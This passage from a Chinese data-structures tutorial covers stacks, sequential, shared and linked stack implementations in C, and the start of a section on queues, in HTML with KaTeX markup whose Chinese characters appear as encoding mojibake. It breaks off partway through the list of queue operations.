class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåˆ™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸ºæ ˆåº•å…ƒç´ ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">a_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸ºæ ˆé¡¶å…ƒç´ ã€‚ç”±äºæ ˆåªèƒ½åœ¨æ ˆé¡¶è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œè¿›æ ˆæ¬¡åºä¾æ¬¡ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,a_3,a_4,a_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè€Œå‡ºæ ˆæ¬¡åºåˆ™ä¸å…¥æ ˆæ¬¡åºç›¸åã€‚ç”±æ­¤å¯è§ï¼Œæ ˆçš„æ“ä½œç‰¹æ€§å¯ä»¥æ˜æ˜¾åœ°æ¦‚æ‹¬ä¸ºåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰ã€‚</p><p>â€‹æ ˆçš„æ•°å­¦æ€§è´¨ï¼šn ä¸ªä¸åŒå…ƒç´ è¿›æ ˆï¼Œå‡ºæ ˆå…ƒç´ ä¸åŒæ’åˆ—çš„ä¸ªæ•°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><msubsup><mi>C</mi><mn>2</mn><mi>n</mi></msubsup><mi>n</mi></mrow><annotation encoding="application/x-tex">\frac{1}{n+1}C^n_2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2484389999999999em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span></span></span></span> ã€‚ä¸Šè¿°å…¬å¼ç§°ä¸ºå¡ç‰¹å…°æ•°ï¼Œå¯é‡‡ç”¨æ•°å­¦å½’çº³æ³•è¯æ˜ã€‚</p><h3 id="2-æ ˆçš„åŸºæœ¬æ“ä½œ"><a class="markdownIt-Anchor" href="#2-æ ˆçš„åŸºæœ¬æ“ä½œ">#</a> 2ã€æ ˆçš„åŸºæœ¬æ“ä½œï¼š</h3><p>â€‹æ ˆçš„åŸºæœ¬æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitStack(&amp;S)<span class="comment">//åˆå§‹åŒ–ä¸€ä¸ªç©ºæ ˆã€‚</span></span><br><span class="line">StackEmpty(S)<span class="comment">//åˆ¤æ–­ä¸€ä¸ªæ ˆæ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ ˆ S ä¸ºç©ºåˆ™è¿”å› ture ï¼Œå¦åˆ™è¿”å› falseã€‚</span></span><br><span class="line">Push(&amp;S,x)<span class="comment">//è¿›æ ˆï¼Œè‹¥æ ˆ S æœªæ»¡ï¼Œåˆ™å°† x åŠ å…¥ä½¿ä¹‹æˆä¸ºæ–°æ ˆé¡¶ã€‚</span></span><br><span class="line">Pop(&amp;S,&amp;x)<span class="comment">//å‡ºæ ˆï¼Œè‹¥æ ˆ S éç©ºï¼Œåˆ™å¼¹å‡ºæ ˆé¡¶å…ƒç´ ï¼Œå¹¶ç”¨ x è¿”å›ã€‚</span></span><br><span class="line">GetTop(S,&amp;x)<span class="comment">//è¯»å–æ ˆé¡¶å…ƒç´ ï¼Œè‹¥æ ˆ S éç©ºï¼Œåˆ™ç”¨ x è¿”å›æ ˆé¡¶å…ƒç´ ã€‚</span></span><br><span class="line">DestroyStack(&amp;S)<span class="comment">//é”€æ¯æ ˆï¼Œå¹¶é‡Šæ”¾æ ˆ S å ç”¨çš„å­˜å‚¨ç©ºé—´ï¼ˆâ€œ&amp; è¡¨ç¤ºå¼•ç”¨è°ƒç”¨â€ï¼‰ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="312-æ ˆçš„é¡ºåºå­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#312-æ ˆçš„é¡ºåºå­˜å‚¨ç»“æ„">#</a> 3.1.2ã€æ ˆçš„é¡ºåºå­˜å‚¨ç»“æ„ï¼š</h2><p>â€‹æ ˆæ˜¯ä¸€ç§æ“ä½œå—é™çš„çº¿æ€§è¡¨ï¼Œç±»ä¼¼äºçº¿æ€§è¡¨ï¼Œå®ƒä¹Ÿæœ‰å¯¹åº”çš„ä¸¤ç§å­˜å‚¨æ–¹å¼ã€‚</p><h3 id="1-é¡ºåºæ ˆçš„å®ç°"><a class="markdownIt-Anchor" href="#1-é¡ºåºæ ˆçš„å®ç°">#</a> 1ã€é¡ºåºæ ˆçš„å®ç°ï¼š</h3><p>â€‹é‡‡ç”¨é¡ºåºå­˜å‚¨çš„æ ˆç§°ä¸ºé¡ºåºæ ˆï¼Œå®ƒåˆ©ç”¨ä¸€ç»„åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒå­˜æ”¾è‡ªæ ˆé¡¶åˆ°æ ˆé¡¶çš„æ•°æ®å…ƒç´ ï¼ŒåŒæ—¶é™„è®¾ä¸€ä¸ªæŒ‡é’ˆï¼ˆtopï¼‰æŒ‡ç¤ºå½“å‰æ ˆé¡¶å…ƒç´ çš„ä½ç½®ã€‚</p><p>â€‹æ ˆçš„é¡ºåºå­˜å‚¨ç±»å‹å¯æè¿°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype data[MaxSize];</span><br><span class="line">    <span class="type">int</span> top;</span><br><span class="line">&#125; SqStack;</span><br></pre></td></tr></table></figure><p>â€‹æ ˆé¡¶æŒ‡é’ˆï¼šs.topï¼Œåˆå§‹æ—¶è®¾ç½® S.top=-1ï¼›æ ˆé¡¶å…ƒç´ ï¼šS.data [S.top]ã€‚</p><p>â€‹è¿›æ ˆæ“ä½œï¼šæ ˆä¸æ»¡æ—¶ï¼Œæ ˆé¡¶æŒ‡é’ˆå…ˆåŠ  1 ï¼Œå†é€å€¼åˆ°æ ˆé¡¶å…ƒç´ ã€‚</p><p>â€‹å‡ºæ ˆæ“ä½œï¼šæ ˆéç©ºæ—¶ï¼Œå…ˆå–æ ˆé¡¶å…ƒç´ å€¼ï¼Œå†å°†æ ˆé¡¶æŒ‡é’ˆå‡ 1.</p><p>â€‹æ ˆç©ºæ¡ä»¶ï¼šS.top==-1ï¼›æ ˆæ»¡æ¡ä»¶ï¼šS.top==MaxSize-1ï¼›æ ˆé•¿ï¼šS.top+1.</p><p>â€‹ç”±äºé¡ºåºæ ˆçš„å…¥æ ˆæ“ä½œå—æ•°ç»„ä¸Šç•Œçš„çº¦æŸï¼Œå½“å¯¹æ ˆçš„æœ€å¤§ä½¿ç”¨ç©ºé—´ä¼°è®¡ä¸è¶³æ—¶ï¼Œæœ‰å¯èƒ½å‘ç”Ÿæ ˆä¸Šæº¢ï¼Œæ­¤æ—¶åº”åŠæ—¶å‘ç”¨æˆ·æŠ¥å‘Šä¿¡æ¯ï¼Œä»¥ä¾¿åŠæ—¶å¤„ç†ï¼Œé¿å…å‡ºé”™ã€‚</p><h3 id="2-é¡ºåºæ ˆçš„åŸºæœ¬è¿ç®—"><a class="markdownIt-Anchor" href="#2-é¡ºåºæ ˆçš„åŸºæœ¬è¿ç®—">#</a> 2ã€é¡ºåºæ ˆçš„åŸºæœ¬è¿ç®—ï¼š</h3><p>â€‹æ ˆæ“ä½œçš„ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆaï¼‰æ˜¯ç©ºæ ˆï¼Œï¼ˆcï¼‰æ˜¯ Aã€Bã€Cã€Dã€E å…± 5 ä¸ªå…ƒç´ ä¾æ¬¡å…¥æ ˆåçš„ç»“æœï¼Œï¼ˆdï¼‰æ˜¯åœ¨ï¼ˆcï¼‰ä¹‹å Eã€Dã€C ç›¸ç»§å‡ºæ ˆï¼Œæ­¤æ—¶æ ˆä¸­è¿˜æœ‰ 2 ä¸ªå…ƒç´ ï¼Œæˆ–è®¸æœ€è¿‘å‡ºæ ˆçš„å…ƒç´  Cã€Dã€E ä»åœ¨åŸå…ˆçš„å•å…ƒå­˜å‚¨ç€ï¼Œä½† top æŒ‡é’ˆå·²ç»æŒ‡å‘äº†æ–°çš„æ ˆé¡¶ï¼Œå…ƒç´  Cã€Dã€E å·²ä¸åœ¨æ ˆä¸­ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b96bea57eb3f411b9349911d140b2277.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸‹é¢æ˜¯é¡ºåºæ ˆä¸Šå¸¸ç”¨çš„åŸºæœ¬è¿ç®—å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> top;</span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack *S)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack *S)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Push</span><span class="params">(SqStack *S,<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(SqStack *S,<span class="type">int</span> *x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetTop</span><span class="params">(SqStack *S,<span class="type">int</span> *x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    InitStack(&amp;S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">6</span>;i++)&#123;</span><br><span class="line">        Push(&amp;S,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(GetTop(&amp;S,&amp;x))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–æ ˆ</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack *S)</span>&#123;</span><br><span class="line">    S-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack *S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…¥æ ˆæ“ä½œ</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Push</span><span class="params">(SqStack *S,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == MaxSize <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    S-&gt;data[++S-&gt;top] = x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡ºæ ˆæ“ä½œ</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(SqStack *S,<span class="type">int</span> *x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *x = S-&gt;data[S-&gt;top--];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯»å–æ ˆé¡¶å…ƒç´ </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetTop</span><span class="params">(SqStack *S,<span class="type">int</span> *x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *x = S-&gt;data[S-&gt;top];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å…±äº«æ ˆ"><a class="markdownIt-Anchor" href="#3-å…±äº«æ ˆ">#</a> 3ã€å…±äº«æ ˆï¼š</h3><p>â€‹åˆ©ç”¨æ ˆåº•ä½ç½®ç›¸å¯¹ä¸å˜çš„ç‰¹æ€§ï¼Œå¯è®©ä¸¤ä¸ªé¡ºåºæ ˆå…±äº«ä¸€ä¸ªä»¥ä¸ºæ•°ç»„ç©ºé—´ï¼Œå°†ä¸¤ä¸ªæ ˆçš„æ ˆåº•åˆ†åˆ«è®¾ç½®åœ¨å…±äº«ç©ºé—´çš„ä¸¤ç«¯ï¼Œä¸¤ä¸ªæ ˆé¡¶å‘å…±äº«ç©ºé—´çš„ä¸­é—´çœ¼ç¥ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/404d770f650a49e5bec8c623ef629c40.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸¤ä¸ªæ ˆçš„æ ˆé¡¶æŒ‡é’ˆéƒ½æŒ‡å‘æ ˆé¡¶å…ƒç´ ï¼Œtop0=-1 æ—¶ 0 å·æ ˆä¸ºç©ºï¼Œtop1=MaxSize æ—¶ 1 å·æ ˆä¸ºç©ºï¼›ä»…å½“ä¸¤ä¸ªæ ˆé¡¶æŒ‡é’ˆç›¸é‚» ï¼ˆtop0-top1=1ï¼‰æ—¶ï¼Œåˆ¤æ–­ä¸ºæ ˆæ»¡ã€‚å½“ 0 å·æ ˆè¿›æ ˆæ—¶ top0 å…ˆåŠ  1 å†èµ‹å€¼ï¼Œ1 å·æ ˆè¿›æ ˆæ—¶ top1 å…ˆå‡ 1 å†èµ‹å€¼ï¼›å‡ºæ ˆæ—¶åˆ™åˆšå¥½ç›¸åã€‚</p><p>â€‹å…±äº«æ ˆæ—¶ä¸ºäº†æ›´æœ‰æ•ˆåœ°åˆ©ç”¨å­˜å‚¨ç©ºé—´ï¼Œä¸¤ä¸ªæ ˆçš„ç©ºé—´ç›¸äº’è°ƒèŠ‚ï¼Œåªæœ‰åœ¨æ•´ä¸ªå­˜å‚¨ç©ºé—´è¢«å æ»¡æ—¶æ‰å‘ç”Ÿä¸Šæº¢ã€‚å…¶å­˜å–æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ä¸º O (1) ï¼Œæ‰€ä»¥å¯¹å­˜å–æ•ˆç‡æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚</p><h2 id="313-æ ˆçš„é“¾å¼å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#313-æ ˆçš„é“¾å¼å­˜å‚¨ç»“æ„">#</a> 3.1.3ã€æ ˆçš„é“¾å¼å­˜å‚¨ç»“æ„ï¼š</h2><p>â€‹é‡‡ç”¨é“¾å¼å­˜å‚¨çš„æ ˆç§°ä¸ºé“¾æ ˆï¼Œé“¾æ ˆçš„ä¼˜ç‚¹æ˜¯ä¾¿äºå¤šä¸ªæ ˆå…±äº«å­˜å‚¨ç©ºé—´å’Œæé«˜å…¶æ•ˆç‡ï¼Œä¸”ä¸å­˜åœ¨æ ˆæ»¡ä¸Šæº¢çš„æƒ…å†µã€‚é€šå¸¸é‡‡ç”¨å•é“¾è¡¨å®ç°ï¼Œå¹¶è§„å®šæ‰€æœ‰æ“ä½œéƒ½æ˜¯åœ¨å•é“¾è¡¨çš„è¡¨å¤´è¿›è¡Œçš„ã€‚è¿™é‡Œè§„å®šé“¾æ ˆæ²¡æœ‰å¤´ç»“ç‚¹ï¼ŒLhead æŒ‡å‘æ ˆé¡¶å…ƒç´ ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/574afc86cafd4c37b2f51933fbd90877.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ˆçš„é“¾å¼å­˜å‚¨ç±»å‹å¯æè¿°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *LiStack;</span><br></pre></td></tr></table></figure><p>â€‹é‡‡ç”¨é“¾å¼å­˜å‚¨ï¼Œä¾¿äºç»“ç‚¹çš„æ’å…¥ä¸åˆ é™¤ã€‚é“¾æ ˆçš„æ“ä½œä¸é“¾è¡¨ç±»ä¼¼ï¼Œå…¥æ ˆå’Œå‡ºæ ˆçš„æ“ä½œéƒ½åœ¨é“¾è¡¨çš„è¡¨å¤´è¿›è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºå¸¦å¤´ç»“ç‚¹å’Œä¸å¸¦å¤´ç»“ç‚¹çš„é“¾æ ˆï¼Œå…·ä½“çš„å®ç°ä¼šæœ‰æ‰€ä¸åŒã€‚</p><h1 id="32-é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#32-é˜Ÿåˆ—">#</a> 3.2ã€é˜Ÿåˆ—ï¼›</h1><h2 id="321-é˜Ÿåˆ—çš„åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#321-é˜Ÿåˆ—çš„åŸºæœ¬æ¦‚å¿µ">#</a> 3.2.1ã€é˜Ÿåˆ—çš„åŸºæœ¬æ¦‚å¿µï¼š</h2><h3 id="1-é˜Ÿåˆ—çš„å®šä¹‰"><a class="markdownIt-Anchor" href="#1-é˜Ÿåˆ—çš„å®šä¹‰">#</a> 1ã€é˜Ÿåˆ—çš„å®šä¹‰ï¼š</h3><p>â€‹é˜Ÿåˆ—ï¼Œä¹Ÿæ˜¯ä¸€ç§æ“ä½œå—é™çš„çº¿æ€§è¡¨ï¼Œåªå…è®¸åœ¨è¡¨çš„ä¸€ç«¯è¿›è¡Œæ’å…¥ï¼Œè€Œè¡¨çš„å¦ä¸€ç«¯è¿›è¡Œåˆ é™¤ã€‚å‘é˜Ÿåˆ—ä¸­æ’å…¥å…ƒç´ æˆä¸ºå…¥é˜Ÿæˆ–è¿›é˜Ÿï¼›åˆ é™¤å…ƒç´ ç§°ä¸ºå‡ºé˜Ÿæˆ–ç¦»é˜Ÿã€‚è¿™å’Œæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„æ’é˜Ÿæ—¶ä¸€è‡´çš„ï¼Œæœ€æ—©æ’é˜Ÿçš„ä¹Ÿæ˜¯æœ€æ—©ç¦»é˜Ÿçš„ï¼Œå…¶æ“ä½œçš„ç‰¹æ€§æ˜¯å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/0af06018a2fb45e7829ac849c4bc386d.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¯¹å¤´ã€‚å…è®¸åˆ é™¤çš„ä¸€ç«¯ï¼Œåˆç§°é˜Ÿé¦–ã€‚</p><p>â€‹é˜Ÿå°¾ã€‚å…è®¸æ’å…¥çš„ä¸€ç«¯ã€‚</p><p>â€‹ç©ºé˜Ÿåˆ—ã€‚ä¸å«ä»»ä½•å…ƒç´ çš„ç©ºè¡¨ã€‚</p><h3 id="2-é˜Ÿåˆ—å¸¸è§çš„åŸºæœ¬æ“ä½œ"><a class="markdownIt-Anchor" href="#2-é˜Ÿåˆ—å¸¸è§çš„åŸºæœ¬æ“ä½œ">#</a> 2ã€é˜Ÿåˆ—å¸¸è§çš„åŸºæœ¬æ“ä½œï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InitQueue(*Q)<span class="comment">//åˆå§‹åŒ–é˜Ÿåˆ—ï¼Œæ„é€ ä¸€ä¸ªç©ºé˜Ÿåˆ— Qã€‚</span></span><br><span class="line">QueueEmpty(*Q)<span class="comment">//åˆ¤é˜Ÿåˆ—ç©ºï¼Œè‹¥é˜Ÿåˆ— Q ä¸ºç©ºè¿”å› true ï¼Œå¦åˆ™è¿”å› falseã€‚</span></span><br><span class="line">EnQueue(*Q,x)<span 